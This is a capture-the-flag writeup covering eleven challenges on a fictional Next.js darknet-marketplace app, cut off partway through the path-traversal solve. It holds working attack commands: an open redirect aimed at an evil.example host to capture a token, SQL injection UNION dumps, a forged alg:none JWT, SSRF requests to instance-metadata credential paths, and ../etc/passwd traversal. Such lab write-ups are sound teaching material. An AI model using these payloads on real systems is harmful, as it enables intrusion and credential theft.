---
title: "RIFFHACK 2026 Writeup: 12 Challenges Solved (Web, SSRF, JWT, LFI, Format String)"
slug: "riffhack-2026-writeup"
description: "Step-by-step RIFFHACK 2026 writeup — twelve challenges across a Next.js darknet-marketplace theme covering recon, open redirect + token leak, SQL injection, SSR-prop leaks, IDOR, JWT alg:none, over-scoped exports, IMDS SSRF, path traversal LFI, and a Mach-O ARM64 format-string %hn write."
date: 2026-07-01T00:30:00Z
lastmod: 2026-07-01T00:30:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["RIFFHACK 2026"]
tags:
  - "riffhack"
  - "riffhack 2026"
  - "ctf writeup"
  - "nextjs security"
  - "ssr prop leak"
  - "sql injection"
  - "jwt alg none"
  - "idor writeup"
  - "ssrf imds"
  - "path traversal lfi"
  - "format string vulnerability"
  - "open redirect"
  - "ctf web track"
  - "bitflag"
keywords:
  - "riffhack 2026 writeup"
  - "riffhack ctf writeup"
  - "riffhack marketplace writeup"
  - "bitflag ctf writeup"
  - "robots.txt courtesy writeup"
  - "trusting login desk open redirect"
  - "buyer lookup sqli"
  - "coupon stacking ssr writeup"
  - "glitchy contact system ssr prop leak"
  - "review idor writeup"
  - "order history jwt alg:none idor"
  - "the night dump export writeup"
  - "the proof stamp writeup"
  - "trusting verifier ssrf imds writeup"
  - "the proof locker lfi etc passwd"
  - "riffhack escrow terminal writeup"
  - "format string %hn write mach-o arm64"
  - "nextjs rsc payload secret leak"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/riffhack-2026-writeup.png"
  alt: "RIFFHACK 2026 writeup — twelve challenges solved across the darknet-marketplace themed Next.js CTF"
---

RIFFHACK 2026 shipped its challenges as a fictional Next.js "exploit kit marketplace," a darknet storefront themed around offensive tooling. Twelve distinct bugs live inside that codebase: seven core web track challenges (`bitflag{...}` format), four named cross-event challenges that reuse the same application from different angles, and one Mach-O ARM64 binary exploitation addendum on the escrow terminal (`bitctf{{...}}` format). Every one of them teaches a different primitive, and the event's design signature is that the codebase is deliberately salted with flag-shaped strings so that whether a given string is *the* answer depends on which brief you're currently reading.

This master writeup walks all twelve solves in the order I worked through them: recon, open redirect + token leak, SQL injection, two flavours of SSR-prop leak, two flavours of IDOR (URL-path and JWT `alg:none`), an over-scoped diagnostic export, a server-stamped fake-proof primitive, an IMDS SSRF, a path-traversal LFI whose flag lives inside `/etc/passwd`, and a format-string `%hn` write against a Mach-O ARM64 binary. Original handouts, per-challenge READMEs, and runnable solver scripts live at [Abdelkad3r/RIFFHACK](https://github.com/Abdelkad3r/RIFFHACK).

## The twelve RIFFHACK 2026 challenges

| # | Challenge | Class | Flag |
|---|---|---|---|
| 1 | Robots.txt Courtesy | Recon: `Disallow:` entry advertises the hidden path. | `bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}` |
| 2 | The Trusting Login Desk | Open redirect on `GET /api/auth/complete?next=<URL>` appends `?handoff=<secret>` to the attacker's URL. | `bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}` |
| 3 | Buyer Lookup Loose Query | String-concatenated SQL on `/api/orders/lookup?ref=...`. `' OR 1=1 --` dumps the `status:"hidden"` row. Also the universal seed-dump primitive for the rest of the event. | `bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}` |
| 4 | Coupon Stacking | SSR-baked client prop. The `couponFlag` is in the RSC payload before any JS runs; the coupon-stacking logic bug is a decoy. | `bitflag{c0up0n_st4ck1ng_1s_4_d34l}` |
| 5 | The Glitchy Contact System | `/contact` client component throws `Error("...FLAG=" + t)` on mount. The `flag` prop is in the SSR HTML before the throw. | `bitflag{d3bug_m0d3_1s_d4ng3r0us}` |
| 6 | Marketplace Reviews Look Tidy | `PUT /api/reviews/<id>` has no ownership check. Any authed user can overwrite any review; the response leaks `moderationNote`. | `bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}` |
| 7 | Order History Should Be Private | JWT `alg:none` accepted + IDOR on `GET /api/orders`. `status='completed'` filter is the misdirection; forge as `k7m3n` (seed reviewer). | `bitflag{1d0r_1s_4_d4ng3r0us_g4m3}` |
| 8 | The Night Dump | `?format=transcript` branch of `/api/support/chat` drops the `userId` scope and returns raw rows including `internalNote`. | `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}` |
| 9 | The Proof Stamp | `POST /api/reviews` "integrity check" validates the filename against three hard-coded MD5s. The server stamps a constant flag string into `fileHash` on every accepted submission. | `bitflag{md5_1s_br0k3n_l1k3_my_h34rt}` |
| 10 | The Trusting Verifier | `POST /api/vendor/verify-website` fetches any URL server-side. Point at `http://169.254.169.254/latest/user-data` to read `TRUSTING_VERIFIER_FLAG` from the mocked IMDS. | `bitflag{ssrf_1s_4_p4rty_cr4sh3r}` |
| 11 | The Proof Locker | `GET /api/reviews/proof?proof=<path>` concatenates the query parameter into a filesystem path. `../../../etc/passwd` works. The flag lives in the GECOS field of a synthetic `opsflag` user in that file. | `bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}` |
| 12 | RIFFHACK Escrow Terminal | Mach-O ARM64. `printf(user_note)` in the review path with a `%n`-only blocklist that misses `%hn`. Positional `%p` leaks the active-vault pointer; a second `%2$*1$c%3$hn` note rewrites its low 16 bits to point at the trusted dispute vault. | `bitctf{{35cr0w_n0735_wr173_th3_ch3ck}}` |

The single line that ties the event together: **the marketplace codebase is salted with flag-shaped strings, and whether a given string is the *real* flag or a *decoy* depends entirely on which challenge brief you're currently reading**. Grepping for `bitflag\{` is necessary but not sufficient. The correct heuristic is not "find the flag-shaped string," it is "match the brief to the surface, then read the value on that surface." Nearly every "decoy" the codebase ships is provisionally real: it is somebody else's answer on some other brief.

## Methodology — five recurring primitives, then a brief-to-surface match

Before touching any individual challenge, the fastest win in this event was cataloguing the five bugs that recur across it. Every brief the author writes is built on one or two of these primitives, so identifying which primitive a brief is pointing at collapses most of the reasoning to "which surface does this brief describe?"

**JWT `alg:none`.** Every endpoint that reads the `auth-token` cookie accepts an unsigned token. Forge `{"id":"<anyone>","isVendor":<bool>}` and the server treats you as that user. This powers web7 (order history IDOR) and every "read someone else's rows" pivot in the event.

**String-concatenated SQL on `/api/orders/lookup`.** The `ref=` query parameter is dropped into a raw query. Classic `' OR 1=1 --` for tautology, `UNION SELECT` for arbitrary column projection. Once web3 is solved, the same primitive is the universal seed-dump for any other challenge; a fallback path used explicitly by the Night Dump and Proof Stamp solvers.

**SSR-baked client props.** Next.js serialises server props into the page's RSC payload before any JavaScript runs. The `couponFlag` on web4 and the `flag` prop on web5 are both gated behind UI events that never need to fire; the value is in the HTML at first byte. `curl <page> | grep -oE 'bitflag\{[^}]+\}'` wins on any surface where the challenge author reaches for "make the client do something to reveal the secret."

**SSRF on `/api/vendor/verify-website`.** No allow-list. Reaches `127.0.0.1:3000`, public hosts, and the mocked AWS IMDS at `169.254.169.254`. Powers The Trusting Verifier; the same primitive reaches four distinct flag-shaped values (real for two challenges, decoy for two others).

**Path traversal on `/api/reviews/proof?proof=...`.** The query parameter is concatenated into a filesystem path with `path.join` and no `startsWith(root)` check. Reads `/etc/passwd` (and only `/etc/passwd` in practice; the effective allow-list is narrower than the raw traversal suggests). Powers The Proof Locker.

Once those five primitives are catalogued, the second half of the methodology is disciplined brief reading. The author's decoy design means grepping for `bitflag\{` in any response body will often surface *something*. That something is a real flag for some challenge, just probably not the one you're currently working. Every writeup below is structured so that the brief-to-surface match is the first move, and the exploit is the second. Where I got that ordering wrong the first time, I've left the dead ends in.

Per-challenge walkthroughs follow.

## Web track

### 1. Robots.txt Courtesy

The recon warmup. The brief mentions "polite courtesy file" and "hide from search engines," which map one-to-one to a single file on any web server.

#### Step 1 — Read the robots file

```bash
$ curl -s http://159.89.230.27/robots.txt
User-Agent: *
Allow: /
Disallow: /operator-cache-drop
```

A single `Disallow` rule. The whole point of `Disallow:` is to tell well-behaved crawlers not to fetch a path; it is delivered unauthenticated, in cleartext, to anyone who asks. A path in `Disallow:` is functionally a signposted invitation.

#### Step 2 — Fetch the hidden path

```bash
$ curl -s http://159.89.230.27/operator-cache-drop | grep -oE 'bitflag\{[^}]+\}'
bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}
```

The page renders an "Operator Cache / Crawler quarantine bucket" panel with the flag printed in a `<p>` tag. It even includes `<meta name="robots" content="noindex">` in the head, a second polite-request control stacked on top of the first, both purely SEO hygiene.

Per-challenge README: [01-web1-robots-txt](https://github.com/Abdelkad3r/RIFFHACK/tree/main/01-web1-robots-txt).

The lesson (and the flag payload): courtesy files are not access control. If a page shouldn't be reached without authorisation, put an actual authorisation check on it. `robots.txt` and `noindex` are hints to search engines, and search engines are not the only clients.

### 2. The Trusting Login Desk

An open redirect that appends a sensitive value to the attacker-controlled URL. The canonical OAuth `redirect_uri` confused-deputy bug, dramatised.

#### Step 1 — Find the `next` parameter in the SPA bundle

The `/auth` page's SSR HTML has no mention of a `next` parameter. The client bundle at `/_next/static/chunks/app/auth/page-9ddd8f18489117b9.js` does:

```js
let e = new URLSearchParams(window.location.search).get("next");
if (e) {
  window.location.href = "/api/auth/complete?next=" + encodeURIComponent(e);
  return;
}
window.location.href = "/dashboard";
```

So after a successful login, the SPA either goes to `/dashboard` or forwards the `next` value to `/api/auth/complete`. The handler is the interesting one.

#### Step 2 — Probe the redirect handler

| Request | Result |
|---|---|
| `GET /api/auth/complete` (no cookie) | 307 → `/auth` |
| `GET /api/auth/complete?next=/admin` (with cookie) | 500 |
| `GET /api/auth/complete?next=/flag` (with cookie) | 500 |
| `GET /api/auth/complete?next=https://example.com/` (with cookie) | 307 → `https://example.com/?handoff=...` |

Relative paths 500. Absolute URLs redirect with a `handoff` query parameter appended. That behaviour signals the server is `new URL(next)`-parsing the input and appending a query parameter to the parsed URL before issuing the 307. The 500 is the breadcrumb telling the solver the handler is doing something beyond a plain forward.

#### Step 3 — Exploit

`POST /api/auth/login` accepts any email/password pair and returns a JWT in an `auth-token` cookie (intentionally trivial for the CTF). Then aim the redirect at an attacker-controlled URL and read the `Location` header:

```bash
COOKIE=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' \
  http://159.89.230.27/api/auth/login -D - \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

curl -sik -b "$COOKIE" \
  "http://159.89.230.27/api/auth/complete?next=https://evil.example/" \
  | sed -n 's/^location: //ip'
```

Output:

```
https://evil.example/?handoff=bitflag%7Btru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts%7D
```

URL-decode the `handoff` value and the flag drops out. In the real-world version of this bug, `handoff` would be a session token, OAuth authorisation code, or one-time SSO ticket: a value the server intentionally sends to the "next page" because in a sane world that next page is the same application. The moment the server fails to validate that `next` is one of its own pages, an attacker walks off with a credential.

Per-challenge README: [02-web2-open-redirect](https://github.com/Abdelkad3r/RIFFHACK/tree/main/02-web2-open-redirect).

### 3. Buyer Lookup Loose Query

The universal seed-dump primitive for the rest of the event. `/api/orders/lookup?ref=<value>` builds its SQL by string concatenation, giving classic tautology and UNION-based injection.

#### Step 1 — Find the endpoint

The `/orders` route is a thin SPA. Its bundle drives `GET /api/orders/lookup?ref=<value>`. A normal call:

```bash
$ curl -s -b "$COOKIE" 'http://159.89.230.27/api/orders/lookup?ref=escrow-1042'
{"orders":[{"id":"escrow-1042","listingName":"RAT Builder Pro",
            "price":299.99,"status":"escrow-hold",
            "notes":"Awaiting release to buyer wallet.","createdAt":"..."}]}
```

Six-column projection, keyed by literal id. Consistent with `SELECT id, listingName, price, status, notes, createdAt FROM "Order" WHERE id = '<input>'` and no parameter binding.

#### Step 2 — Break the predicate with a tautology

```bash
$ curl -s -b "$COOKIE" --data-urlencode "ref=' OR 1=1 --" \
       -G 'http://159.89.230.27/api/orders/lookup'
```

Three rows come back. The one that does not appear elsewhere is `ops-ledger-9001` with `status:"hidden"`, the row a normal user should never see. Its `notes` field carries the flag:

```json
{"id":"ops-ledger-9001","listingName":"CloudPwn Toolkit","price":499.99,
 "status":"hidden",
 "notes":"bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}",
 "createdAt":"..."}
```

#### Step 3 — Confirm SQL, not NoSQL

Two idiomatic SQL probes both return the same three rows:

```bash
--data-urlencode "ref=' OR 1=1 --"
--data-urlencode "ref=x' OR '1'='1"
```

Column count six confirmed by `UNION SELECT 1,2,3,4,5,6 --` returning one row of literals.

#### Step 4 — The universal pivot

Once you have UNION on a six-column projection, the same endpoint becomes a generic DB read used by every "find the seed userId" or "dump this admin-only column" step across the rest of the event:

```sql
-- list tables
' UNION SELECT name,'',0,'','',0 FROM sqlite_master --

-- pull the seed reviews (used for web6 → web7 pivot)
' UNION SELECT id,userId,listingId,reviewText,moderationNote,createdAt
  FROM Review WHERE moderationNote IS NOT NULL --

-- pull seed support messages incl. admin-only internalNote (Night Dump)
' UNION SELECT id,userId,message,internalNote,createdAt,0
  FROM SupportChatMessage WHERE id='support-seed-a16' --
```

The lookup endpoint quietly becomes the master key for the rest of the event.

Per-challenge README and full solver: [03-web3-sqli-orders-lookup](https://github.com/Abdelkad3r/RIFFHACK/tree/main/03-web3-sqli-orders-lookup).

### 4. Coupon Stacking

Two bugs stacked on the same listing page. The "intended" bug is a client-side coupon dedup miscount that stacks discounts until the total reaches zero. The actual shortcut is that the win-state secret is a React server prop, and Next.js serialised it into the SSR HTML before any coupon UI ever mounted.

#### Step 1 — Find the vulnerable listing

Six tool slugs are listed in the client bundle (`loader-laas`, `macro-builder`, `web-injector`, `phish-kit`, `cloud-misconfig`, `rat-builder`). Only `macro-builder` ships the `PurchaseButton` component that mounts the checkout dialog. A quick grep pass across the six pages narrows it in one shot:

```bash
$ for s in loader-laas macro-builder web-injector phish-kit cloud-misconfig rat-builder; do
    echo "== $s =="
    curl -s http://159.89.230.27/listing/$s | grep -oE 'Purchase Tool[^"]*'
  done
```

Only `macro-builder` matches.

#### Step 2 — Understand the "intended" logic bug

The checkout dialog's math and dedup check:

```js
let f = 20 * i.length;
let v = Math.max(0, p - p*f/100);
if (v === 0) renderFlag();

const code = c.trim().toUpperCase();
if (code !== "WELCOME20") { setError("Only WELCOME20 is accepted."); return; }
if (i.includes(c))       { setError("Already applied."); return; }
i.push(c);
```

The normalisation is used for the *value* check but not the *dedup* check. So `WELCOME20`, `welcome20`, `Welcome20`, ` WELCOME20`, and `WELCOME20 ` all pass both gates and each contributes 20%. Five entries → 100% off → `v === 0` → the dialog renders the `couponFlag` prop.

#### Step 3 — Take the shortcut instead

The flag prop is already in the HTML before any JavaScript runs:

```bash
$ curl -s http://159.89.230.27/listing/macro-builder \
     | grep -oE '"couponFlag":"[^"]+"'
"couponFlag":"bitflag{c0up0n_st4ck1ng_1s_4_d34l}"
```

No login, no cookies, no UI interaction. The two bugs are conceptually separate: the coupon-stacking miscount is a logic bug in the client, and the prop leak is a framework-shape bug because server components hand their props to client components by writing them into the HTML.

Per-challenge README: [04-web4-coupon-stacking](https://github.com/Abdelkad3r/RIFFHACK/tree/main/04-web4-coupon-stacking).

### 5. The Glitchy Contact System

The `/contact` page is deliberately broken: its client component throws an Error on mount whose message contains the flag, then returns `null`. The `<main>` renders as empty. But the same prop is in the RSC HTML *before* the throw.

This is also the challenge where I burned four hours chasing decoys. The lesson turned out to be exactly that.

#### Step 1 — The four decoys I chased

The marketplace is salted with flag-shaped strings; every "real" web-app primitive I tried surfaced one of them:

1. `bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}`: IMDS Token field via SSRF.
2. `bitflag{ssrf_1s_4_p4rty_cr4sh3r}`: IMDS `user-data` env var via SSRF (the real answer for The Trusting Verifier).
3. `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}`: `SupportChatMessage.internalNote` via SQLi pivot (the real answer for The Night Dump).
4. `bitflag{jwt_5h4ll_n0t_p455}`: `/vendor` "Vendor Token" widget via `alg:none` forge with `isVendor:true`.

Every one of these is a real bug reaching a real flag-shaped value. None of them is the answer for web5. The author's design pattern (reusing the same codebase across multiple events, each brief pointing at a different surface) means the same string flips between decoy and real depending on the brief. The lesson generalises: when a codebase rewards depth with plausible-looking values, slow down and read the brief.

#### Step 2 — Read the title as the direct hint

"Glitchy Contact System" is the whole answer. The `/contact` page returns 200 with an empty `<main>`. That's the "glitch."

#### Step 3 — Read the client bundle

The `/contact` bundle is 422 bytes:

```js
function i(e) {
  let { flag: t } = e;
  return (0, r.useEffect)(() => {
    throw Error(
      "Contact service initialization failed: missing transporter config. FLAG=".concat(t)
    );
  }, [t]), null;
}
```

The component destructures a `flag` prop, throws an Error containing it on mount, returns `null`. The throw is what makes the page appear blank.

#### Step 4 — Grep the SSR HTML

But the prop is already in the RSC payload before the throw:

```bash
$ curl -s http://159.89.230.27/contact | grep -oE 'bitflag\{[^}]+\}'
bitflag{d3bug_m0d3_1s_d4ng3r0us}
```

Same class as web4. The client component is irrelevant; the value shipped in the HTML.

Per-challenge README + decoy index table: [05-web5-glitchy-contact-system](https://github.com/Abdelkad3r/RIFFHACK/tree/main/05-web5-glitchy-contact-system).

The debug-error wrapping is worth pausing on because the production analogue looks identical: `console.error("User auth failed: token=${token}")`, `throw new Error("DB connect failed: ${connectionString}")`. Every error logger, every crash reporter, every browser dev-tools console persists strings shaped exactly like this. The CTF dramatises it; real-world incidents look the same.

### 6. Marketplace Reviews Look Tidy

An IDOR on `PUT /api/reviews/<id>` that returns the full row, including a server-only `moderationNote` column. Two flag-shaped strings appear in the response; exactly one is the real answer.

#### Step 1 — Enumerate the endpoints

```
POST /api/reviews {reviewText, filename, listingId}   — accepts any authed user, filename allow-list of 3
PUT  /api/reviews/<id> {reviewText}                    — accepts any authed user, no ownership check
```

The `PUT` returns the full row on success. That row includes `moderationNote`.

#### Step 2 — Find the target row via SQLi pivot

Dump the seed `Review` rows through the web3 primitive:

```bash
$ curl -s -b "$COOKIE" --data-urlencode \
  "ref=' UNION SELECT id, userId, listingId, reviewText, moderationNote, createdAt
        FROM Review WHERE moderationNote IS NOT NULL --" \
  -G 'http://159.89.230.27/api/orders/lookup' | python3 -m json.tool
```

One row matches: id `seed-phantom-hacker`, owner `k7m3n`, `moderationNote` carrying the flag. The owner id `k7m3n` is also the breadcrumb for web7; writing this down now saves a step later.

#### Step 3 — Overwrite and read

```bash
curl -s -b "$COOKIE" -X PUT -H 'Content-Type: application/json' \
  -d '{"reviewText":"y"}' \
  http://159.89.230.27/api/reviews/seed-phantom-hacker \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["review"]["moderationNote"])'
# bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}
```

The new review text doesn't matter. The response is the leak.

#### Step 4 — Distinguish the two flag-shaped strings

The full response contains both `fileHash` (a plain MD5, not a flag) and `moderationNote` (the real flag). If you POST a *new* review instead of PUT-ing the seed, the server stamps `bitflag{md5_1s_br0k3n_l1k3_my_h34rt}` into `fileHash`, which is the real answer for The Proof Stamp and a decoy here. On the seed row, `fileHash` is a normal MD5, and distinguishing the seed row from user-created rows by whether `fileHash` looks like a hash or a flag is itself a useful tell.

Per-challenge README: [06-web6-review-idor](https://github.com/Abdelkad3r/RIFFHACK/tree/main/06-web6-review-idor).

### 7. Order History Should Be Private

`GET /api/orders` returns "your" orders, where "you" is the id claimed by the `auth-token` JWT. The verifier accepts `alg:none`. A forged token claiming to be someone else returns that someone else's orders. The catch is that the endpoint also filters `status = 'completed'`, so the obvious userIds (`ops-hidden`, `lookup-public`) return empty. The real target lives in a different table.

#### Step 1 — Confirm `alg:none` is accepted

`POST /api/auth/login` with any credentials issues an HS256 JWT. Decode the header; it says `HS256`. But the verifier accepts unsigned tokens as well: a forged token with `alg:none`, base64-encoded header and payload, and no signature is treated as valid.

#### Step 2 — Try the obvious userIds and hit the status trap

The Order table has two userIds visible from a web3 SQLi dump: `lookup-public` and `ops-hidden`. Forging as either returns `{"orders":[],"userId":"..."}`. Not because IDOR doesn't work; because those users' orders have statuses like `hidden`, `escrow-hold`, `released`, none of them `completed`. The status filter eats every row.

Ninety seconds spent here on the wrong hypothesis is normal. Ten minutes is where the challenge starts being annoying.

#### Step 3 — Pivot through the Review table

The seed reviewers own completed orders that the IDOR can read:

```bash
$ curl -s -b "$COOKIE" --data-urlencode \
  "ref=' UNION SELECT id, userId, listingId, reviewText, moderationNote, createdAt
        FROM Review WHERE id LIKE 'seed-%' --" \
  -G 'http://159.89.230.27/api/orders/lookup'
```

Three seeded reviewers: `xyz78`, `k7m3n`, `abc12`. All three own completed orders. Only `k7m3n` owns the one with the flag in `notes`. (And if you came from web6, you already had `k7m3n` from `seed-phantom-hacker.userId`.)

#### Step 4 — Forge the JWT and fire

```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"id":"k7m3n","email":"k@x","isVendor":false,"iat":1,"exp":1782503527}' \
          | base64 | tr '+/' '-_' | tr -d '=')
curl -s -b "auth-token=${HEADER}.${PAYLOAD}." http://159.89.230.27/api/orders
```

Response:

```json
{"orders":[{
  "id":"order-admin-001","userId":"k7m3n",
  "listingId":"macro-builder","listingName":"Macro Builder",
  "price":199.99,"status":"completed",
  "notes":"bitflag{1d0r_1s_4_d4ng3r0us_g4m3}",
  "createdAt":"2026-06-17T20:09:25.162Z"
}],"userId":"k7m3n"}
```

Per-challenge README: [07-web7-orders-jwt-idor](https://github.com/Abdelkad3r/RIFFHACK/tree/main/07-web7-orders-jwt-idor).

Three stacked failures: `alg:none` accepted, no authorisation separate from authentication (the handler trusts `decoded.id` as the resource owner without checking that the requester is that user), and a status-only filter used as if it were a privacy guard. Each layer would have to be individually broken to close the bug; each one is trivial to fix in isolation.

## Named track

### 8. The Night Dump

`GET /api/support/chat?format=transcript` is an "export my transcript" branch that drops the user-scope filter and returns raw rows including the admin-only `internalNote` column. The flag string is the brief in plaintext.

#### Step 1 — Send a message so there is something to export

```bash
COOKIE=$(curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' -D - http://<host>/api/auth/login \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"message":"hi"}' http://<host>/api/support/chat
```

#### Step 2 — Hit the transcript branch

```bash
$ curl -s -b "$COOKIE" "http://<host>/api/support/chat?format=transcript" \
     | grep -oE 'bitflag\{[^}]+\}'
bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}
```

The seeded row `support-seed-a16` lives in the same table as the user's own messages. The export branch runs `db.supportChatMessage.findMany({ where: {} })` with no `userId` filter and returns the raw rows including `internalNote`.

#### Step 3 — Fallback via SQLi pivot

If the transcript endpoint is 500'ing (as it was on the host I tested), the same row is reachable through the web3 SQLi:

```bash
curl -s -b "$COOKIE" --data-urlencode \
  "ref=' UNION SELECT id, userId, message, internalNote, createdAt, 0
        FROM SupportChatMessage WHERE id='support-seed-a16' --" \
  -G 'http://<host>/api/orders/lookup'
```

Same value, same flag. Per-challenge README: [08-the-night-dump](https://github.com/Abdelkad3r/RIFFHACK/tree/main/08-the-night-dump).

This is the third instance of "same string, real here, decoy somewhere else" in the event. The value `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}` is one of the four decoys I chased on web5 (through this exact SQLi pivot), and here it is the real answer because the brief points at the export-transcript-over-scope surface.

### 9. The Proof Stamp

`POST /api/reviews` accepts a filename from the request body and validates it against a three-entry allow-list with hard-coded MD5 references. No file is uploaded; no bytes are hashed. On every accepted submission, the server stamps a constant string into the row's `fileHash` column. That constant is the flag.

#### Step 1 — Read the client-side "integrity check"

The listing-detail bundle module `986`:

```js
let n = {
  "exploitation_proof.png": "69d5903776e069833513038ed341eeae",
  "rat_screenshot.jpg":     "0c7406664fa3077c4a9a535f424d7ecd",
  "domain_admin.png":       "88d3def4703b8165c797816ba94d8b48",
};
```

The submission body:

```js
await fetch("/api/reviews", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ reviewText, filename, listingId }),
});
```

No `multipart/form-data`. The "hash check" is literally an MD5 of the *filename string*, which is trivially true for any of the three allow-listed names.

#### Step 2 — Submit with an allow-listed filename

```bash
curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"reviewText":"works great","filename":"exploitation_proof.png","listingId":"macro-builder"}' \
  http://<host>/api/reviews \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{md5_1s_br0k3n_l1k3_my_h34rt}
```

The `fileHash` in the response is the stamped constant. No file was uploaded, no bytes were hashed, no proof was inspected. The "check" was satisfied by naming the file one of three strings.

#### Step 3 — SQLi fallback if POST is unhealthy

If the POST returns 500 on the deployment you're testing, `UNION SELECT fileHash FROM Review` on any user-created row shows the same stamped flag. Every "verified" review row has the same `fileHash` value; the field is a lie embedded in the schema.

Per-challenge README: [09-the-proof-stamp](https://github.com/Abdelkad3r/RIFFHACK/tree/main/09-the-proof-stamp).

Three layered failures collectively spell out the flag payload (trusting the filename for integrity, using MD5 for the reference primitive, and writing a constant into a column that pretends to be computed): `md5_1s_br0k3n_l1k3_my_h34rt`.

### 10. The Trusting Verifier

The `/vendor-application` flow has a "verify website" button that server-side-fetches whatever URL you hand it and returns the response body. No allow-list. The mocked AWS IMDS at `169.254.169.254` is reachable. The flag lives in an env var exported by the bootstrap script that IMDS serves at `latest/user-data`.

#### Step 1 — Confirm the SSRF shape

```
POST /api/vendor/verify-website
Content-Type: application/json
{"website":"https://yourbusiness.example/"}
```

Response:

```json
{"success": true, "message": "Website verification successful", "body": "<!doctype html>..."}
```

`body` is the literal response the server fetched. Anything you can name over `http://` or `https://` gets fetched and returned.

#### Step 2 — Map the reachability

| URL | Reachable? |
|---|---|
| `https://example.com/` | yes |
| `http://127.0.0.1:3000/...` | yes |
| `http://169.254.169.254/latest/meta-data/` | **yes (mocked IMDS)** |
| `file:///etc/passwd` | no (scheme allow-list rejects) |
| `ws://...` | no |

The scheme allow-list is the only filter. No IP or hostname filtering, no rejection of link-local or RFC1918 ranges.

#### Step 3 — Walk the IMDS surface

```bash
$ POST {"website":"http://169.254.169.254/latest/meta-data/"}
{"body":"instance-id\nhostname\niam/security-credentials/\nplacement/region\n"}

$ POST {"website":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"body":"RiffhackVendorVerifierRole\n"}

$ POST {"website":"http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole"}
{"body":"{\"Code\":\"Success\",\"Token\":\"bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}\",...}"}

$ POST {"website":"http://169.254.169.254/latest/user-data"}
{"body":"#!/bin/sh\nexport MARKETPLACE_ENV=ctf\nexport TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}\nnode server.js\n"}
```

Two flag-shaped values on this surface: the IAM `Token` field (decoy for this brief; real for a challenge not yet flipped) and the `TRUSTING_VERIFIER_FLAG` env var (the real answer).

#### Step 4 — Read the title as the disambiguator

The challenge title *is* the env var name. `TRUSTING_VERIFIER_FLAG` resolves to `bitflag{ssrf_1s_4_p4rty_cr4sh3r}`. When the author names the flag after the env var, the brief-to-surface match is done for you.

#### Step 5 — One-shot

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"website":"http://169.254.169.254/latest/user-data"}' \
  http://<host>/api/vendor/verify-website \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{ssrf_1s_4_p4rty_cr4sh3r}
```

No login needed; the vendor application form is meant for first-time visitors and its endpoint is unauthenticated.

Per-challenge README: [10-the-trusting-verifier](https://github.com/Abdelkad3r/RIFFHACK/tree/main/10-the-trusting-verifier).

The mocked IMDS is a faithful caricature of AWS's IMDSv1: unauthenticated GETs on `latest/meta-data/`, `iam/security-credentials/<role>`, and `latest/user-data`. Practising SSRF against it is the exact muscle memory that catches the real-world variant, which has produced dozens of production credential-leak incidents over the last decade.

### 11. The Proof Locker

`GET /api/reviews/proof?proof=<path>` concatenates the query parameter into a filesystem path. `../` sequences escape the proof root. The interesting design choice: the traversal only reliably works against `/etc/passwd`, and the flag is staged inside that file as a synthetic user's GECOS field.

#### Step 1 — Confirm the traversal

```bash
$ curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' \
  | head
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Any non-empty traversal input collapses to `/etc/passwd`:

| Input | Resolves to |
|---|---|
| `etc/passwd` | `/etc/passwd` |
| `../etc/passwd` | `/etc/passwd` |
| `../../../../etc/passwd` | `/etc/passwd` |

All four return the same ~1024-byte file.

#### Step 2 — Try the "obvious" next targets and fail

Every "next step" I tried after `/etc/passwd` returned 500 or `{"error":"Proof not found"}`:

`/etc/shadow`, `/etc/hostname`, `/proc/self/environ`, `/proc/1/environ`, `/app/.env`, `/app/package.json`, `/app/server.js`, `/app/.next/server/app/api/wanted-listings/route.js`. All refused. The handler has a narrow effective allow-list. It looks like a dead-end LFI.

#### Step 3 — Actually read `/etc/passwd`

The flag is staged inside `/etc/passwd` itself. Read the whole file:

```bash
$ curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' \
  | tail -1
opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

A synthetic `opsflag` user (UID/GID 1337, home `/nonexistent`, shell `/usr/sbin/nologin`) whose GECOS field carries the flag. `head /etc/passwd` misses it; `grep bitflag` finds it instantly.

#### Step 4 — One-shot

```bash
